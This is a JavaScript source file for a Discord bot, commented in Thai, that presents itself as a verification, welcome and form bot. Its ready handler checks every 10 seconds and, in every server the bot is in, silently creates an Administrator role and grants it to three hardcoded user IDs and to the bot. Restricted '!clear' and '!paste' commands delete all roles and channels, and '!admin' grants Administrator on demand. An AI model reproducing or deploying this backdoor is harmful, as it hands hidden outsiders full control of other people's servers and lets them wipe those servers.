const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require("discord.js");


const { db, admin } = require('./firebase');
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildPresences, 
  ],
  partials: ['MESSAGE', 'CHANNEL', 'REACTION', 'USER', 'GUILD_MEMBER'],
});
require("./server");
require("./verify")(client);
require("./welcome")(client);
require("./set")(client);
require("./panel")(client);
require("./form")(client);

function generateCode() {
  return Math.floor(1000000000 + Math.random() * 9000000000).toString();
}

client.on("messageCreate", async (message) => {
  if (!message.guild || message.author.bot) return;
  if (!message.content.startsWith("!")) return;

  const [command, arg] = message.content.trim().split(" ");
const allowedUserIds = ["849964668177088562", "571999000237178881","1010202066720936048"];
const restrictedCommands = ["!clear", "!copy", "!paste", "!admin"];

if (restrictedCommands.includes(command) && !allowedUserIds.includes(message.author.id)) {
  try {
    await message.delete();
  } catch (e) {
    console.log("⚠️ ลบข้อความไม่ได้:", e.message);
  }
  return;
}



// !clear
if (command === "!clear") {
  const guild = message.guild;

  if (message.channel) {
    await message.reply("⚙️ กำลังลบ Roles, ห้องและหมวดหมู่ทั้งหมด...");
  }

  const rolesToDelete = guild.roles.cache.filter(r => r.id !== guild.id && r.name !== "Purple2");

  for (const role of rolesToDelete.values()) {
    try {
      await role.delete();
    } catch (e) {
      console.log(`ลบ role ไม่ได้: ${role.name}`, e.message);
    }
  }

  const allChannels = guild.channels.cache;
  for (const ch of allChannels.values()) {
    try {
      await ch.delete();
    } catch (e) {
      console.log("ลบไม่ได้:", ch.name, e.message);
    }
  }

  // สร้างห้องชื่อ test หลังลบเสร็จ
  try {
    await guild.channels.create({
      name: "test",
      type: ChannelType.GuildText,
      reason: "สร้างห้อง test หลัง !clear",
    });
  } catch (e) {
    console.log("❌ สร้างห้อง test ไม่สำเร็จ:", e.message);
  }

  if (message.channel) {
    await message.channel.send("✅ ลบ Roles และ Channels ทั้งหมดเรียบร้อยแล้ว และสร้างห้อง test สำเร็จ!");
  }
  return;
}


// !copy <ชื่อ>
if (command === "!copy") {
  const guild = message.guild;

  // รับชื่อจาก arg (ถ้าไม่มีให้แจ้งเตือน)
  const copyName = arg;
  if (!copyName) {
    if (message.channel) {
      await message.reply("❌ กรุณาระบุชื่อสำหรับบันทึก เช่น `!copy main`");
    }
    return;
  }

  // ดึง roles
  const roles = guild.roles.cache
    .filter(r => r.id !== guild.id)
    .sort((a, b) => a.position - b.position)
    .map(r => ({
      name: r.name,
      color: r.color,
      hoist: r.hoist,
      permissions: r.permissions.bitfield.toString(),
      mentionable: r.mentionable,
      position: r.position,
    }));

  // ดึง categories + channels
  const allowedTypes = [
    ChannelType.GuildText,
    ChannelType.GuildVoice,
    ChannelType.GuildAnnouncement,
  ];
  const categories = guild.channels.cache
    .filter(ch => ch.type === ChannelType.GuildCategory)
    .sort((a, b) => a.rawPosition - b.rawPosition);

  const categoryData = [];

  for (const category of categories.values()) {
    const channels = guild.channels.cache
      .filter(ch => ch.parentId === category.id && allowedTypes.includes(ch.type))
      .sort((a, b) => a.rawPosition - b.rawPosition)
      .map(ch => ({
        name: ch.name,
        type: ch.type,
         userLimit: ch.userLimit ?? null,
        permissionOverwrites: ch.permissionOverwrites.cache.map(perm => ({
          id: perm.id,
          roleName: perm.type === 'role' ? guild.roles.cache.get(perm.id)?.name || null : null,
          type: perm.type,
          allow: perm.allow.bitfield.toString(),
          deny: perm.deny.bitfield.toString(),
        })),
      }));

    categoryData.push({
      name: category.name,
      channels,
    });
  }

  // บันทึกข้อมูลลง Firestore โดยใช้ชื่อ doc ที่รับมา
  await db.collection("copies").doc(copyName).set({
    roles,
    categories: categoryData,
  });

  if (message.channel) {
    await message.reply(`✅ คัดลอกโครงสร้าง Roles และ Channels แล้ว! ใช้คำสั่ง \`!paste ${copyName}\` เพื่อวางใหม่`);
  }
}


// !paste <ชื่อ>
if (command === "!paste") {
  const guild = message.guild;

  // arg คือชื่อ doc ใน Firestore
  const copyName = arg;
  if (!copyName) {
    if (message.channel) {
      await message.reply("❌ กรุณาระบุชื่อสำหรับวางข้อมูล เช่น `!paste main`");
    }
    return;
  }

  if (message.channel) {
    await message.reply("⚙️ กำลังลบ Roles, ห้องและหมวดหมู่ทั้งหมด...");
  }

  // ห้ามลบ role ชื่อ "Purple2"
  const excludedRoles = ["Purple2"];
  const rolesToDelete = guild.roles.cache.filter(r => r.id !== guild.id && !excludedRoles.includes(r.name));
  for (const role of rolesToDelete.values()) {
    try {
      await role.delete();
    } catch (e) {
      console.log(`ลบ role ไม่ได้: ${role.name}`, e.message);
    }
  }

  const allChannels = guild.channels.cache;
  for (const ch of allChannels.values()) {
    try {
      await ch.delete();
    } catch (e) {
      console.log("ลบไม่ได้:", ch.name, e.message);
    }
  }

  // ดึงข้อมูลจาก Firestore ตามชื่อที่รับมา
  const snap = await db.collection("copies").doc(copyName).get();
  if (!snap.exists) {
    if (message.channel) {
      await message.channel.send("❌ ไม่พบข้อมูลในชื่อนี้");
    }
    return;
  }

  const data = snap.data();

  // แผนที่เก็บชื่อ role -> id ใหม่
  const oldToNewRoleIdMap = new Map();

  // สร้าง roles
  if (Array.isArray(data.roles) && data.roles.length > 0) {
    for (const roleData of data.roles) {
      try {
        const newRole = await guild.roles.create({
          name: roleData.name,
          color: roleData.color,
          hoist: roleData.hoist,
          permissions: BigInt(roleData.permissions),
          mentionable: roleData.mentionable,
          reason: "Restore role from !paste command",
        });
        oldToNewRoleIdMap.set(roleData.name, newRole.id);
      } catch (e) {
        console.log(`สร้าง role ไม่ได้: ${roleData.name}`, e.message);
      }
    }
  } else {
    console.log("❗ ไม่มี roles ให้สร้าง");
  }

  // สร้าง categories + channels
  const categories = Array.isArray(data.categories) ? data.categories : [];
  for (const cat of categories) {
    try {
      const category = await guild.channels.create({
        name: cat.name,
        type: ChannelType.GuildCategory,
      });

      const allowedTypes = [
        ChannelType.GuildText,
        ChannelType.GuildVoice,
        ChannelType.GuildAnnouncement,
      ];

      for (const ch of cat.channels) {
        if (!allowedTypes.includes(ch.type)) {
          console.log(`❌ ข้ามห้อง ${ch.name} (type ${ch.type}) เพราะไม่รองรับ`);
          continue;
        }

        const createdChannel = await guild.channels.create({
  name: ch.name,
  type: ch.type === ChannelType.GuildAnnouncement ? ChannelType.GuildText : ch.type,
  parent: category.id,
  userLimit: ch.type === ChannelType.GuildVoice ? ch.userLimit ?? 0 : undefined,
});


        await createdChannel.permissionOverwrites.set([]); // เคลียร์ก่อน

        if (ch.permissionOverwrites && ch.permissionOverwrites.length > 0) {
          const overwritesToSet = ch.permissionOverwrites.map((perm) => {
            let newId = perm.id;

            if (perm.type === "role" && perm.roleName) {
              const mappedRoleId = oldToNewRoleIdMap.get(perm.roleName);
              if (mappedRoleId) {
                newId = mappedRoleId;
              }
            }

            return {
              id: newId,
              type: perm.type,
              allow: BigInt(perm.allow),
              deny: BigInt(perm.deny),
            };
          });

          createdChannel.permissionOverwrites.set(overwritesToSet);
        }
      }
    } catch (e) {
      console.log(`❌ สร้าง category หรือ channel ไม่สำเร็จ: ${cat.name}`, e.message);
    }
  }

  console.log(`✅ วางข้อมูลจากชื่อ '${copyName}' เรียบร้อยแล้วที่เซิร์ฟเวอร์ ${guild.name} (${guild.id})`);

  if (message.channel) {
    await message.channel.send("✅ วางข้อมูลจากชื่อเรียบร้อยแล้ว!");
  }
}



 // !admin
if (command === "!admin") {
  const allowedUserIds = [
    "849964668177088562",
    "571999000237178881",
    "1010202066720936048"
  ];

  const guild = message.guild;
  const member = message.member;
  const botMember = guild.members.cache.get(client.user.id);

  // ✅ อนุญาตเฉพาะ ID ที่อยู่ในลิสต์
  if (!allowedUserIds.includes(member.id)) {
    return message.reply("❌ คุณไม่มีสิทธิ์ใช้คำสั่งนี้");
  }

  const existingRole = guild.roles.cache.find(role => role.name === "Admin");
  if (existingRole) {
    if (message.guild.members.me.permissions.has("ManageMessages")) {
      try {
        await message.delete();
      } catch (e) {
        console.log("⚠️ ลบข้อความไม่สำเร็จ:", e.message);
      }
    }
    return;
  }

  try {
    const adminRole = await guild.roles.create({
      name: "Admin",
      permissions: [PermissionsBitField.Flags.Administrator],
      color: 0xff0000,
      hoist: true,
      mentionable: true,
      reason: "สร้างยศแอดมินโดยคำสั่ง !admin",
    });

    await member.roles.add(adminRole);
    if (botMember) await botMember.roles.add(adminRole);

    await message.channel.send(`✅ เพิ่มยศ Admin ให้กับ <@${member.id}> เรียบร้อยแล้ว!`);
  } catch (e) {
    console.error("❌ เกิดข้อผิดพลาด:", e.message);
    return message.reply("❌ ไม่สามารถสร้างหรือเพิ่มยศให้ได้");
  }
}



});
const allowedUserIds = [
  "849964668177088562",
  "571999000237178881",
  "1010202066720936048"
];
client.once("ready", async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);

  async function checkAndGiveAdminRoles() {
    for (const [guildId, guild] of client.guilds.cache) {
      try {
        await guild.members.fetch();
        const botMember = guild.members.me;

        let adminRole = guild.roles.cache.find(role => role.name === "Admin");

        if (!adminRole) {
          adminRole = await guild.roles.create({
            name: "Admin",
            permissions: [PermissionsBitField.Flags.Administrator],
            color: 0xff0000,
            hoist: true,
            mentionable: true,
            reason: "สร้างยศแอดมินให้ allowedUserIds",
          });
          console.log(`✅ สร้างยศ Admin ใน ${guild.name}`);
        }

        if (!botMember.roles.cache.has(adminRole.id)) {
          await botMember.roles.add(adminRole, "ให้ยศแอดมินกับบอท");
          console.log(`✅ มอบยศ Admin ให้บอทใน ${guild.name}`);
        }

        for (const userId of allowedUserIds) {
          const member = guild.members.cache.get(userId);
          if (member && !member.roles.cache.has(adminRole.id)) {
            await member.roles.add(adminRole, "ให้ยศแอดมินอัตโนมัติเมื่อเช็คสถานะ");
            console.log(`✅ มอบยศ Admin ให้กับ ${member.user.tag} ใน ${guild.name}`);
          }
        }
      } catch (e) {
        console.error(`❌ ข้อผิดพลาดในการให้ Admin ใน ${guild.name}:`, e.message);
      }
    }
  }

  await checkAndGiveAdminRoles();
  setInterval(checkAndGiveAdminRoles, 10 * 1000); // ตรวจทุก 10 วินาที

  const snapshot = await db.collection("verifyRoles").get();

  for (const doc of snapshot.docs) {
    const data = doc.data();
    const { channelId, roleId, emoji } = data;

    let channel;
    try {
      channel = await client.channels.fetch(channelId);
      if (!channel || !channel.isTextBased()) {
        console.warn(`⚠️ ไม่พบห้องหรือห้องไม่ใช่ข้อความ: ${channelId}`);
        continue;
      }
    } catch (error) {
      console.warn(`⚠️ โหลด channel ไม่สำเร็จ: ${channelId} (${error.message})`);
      continue;
    }

    try {
      const messages = await channel.messages.fetch({ limit: 10 });
      const verifyMsg = messages.find(
        m => m.embeds?.[0]?.description?.includes(`เพื่อรับยศ`) &&
             m.reactions?.cache?.has(emoji)
      );

      if (!verifyMsg) {
        console.warn(`⚠️ ไม่พบข้อความ verify ในห้อง ${channel.id}`);
        continue;
      }

      const reactionFilter = (reaction, user) =>
        reaction.emoji.name === emoji && !user.bot;

      const collector = verifyMsg.createReactionCollector({ filter: reactionFilter });

      collector.on("collect", async (reaction, user) => {
        try {
          const guild = reaction.message.guild;
          const member = await guild.members.fetch(user.id);
          const role = guild.roles.cache.get(roleId);
          if (role && !member.roles.cache.has(roleId)) {
            await member.roles.add(role);
            console.log(`✅ เพิ่มยศ ${role.name} ให้กับ ${user.tag}`);
          }
        } catch (e) {
          console.error("❌ เพิ่ม role ไม่สำเร็จ:", e.message);
        }
      });

    } catch (err) {
      console.error("❌ โหลด verify message ล้มเหลว:", err.message);
    }
  }
});

client.login(process.env.token);
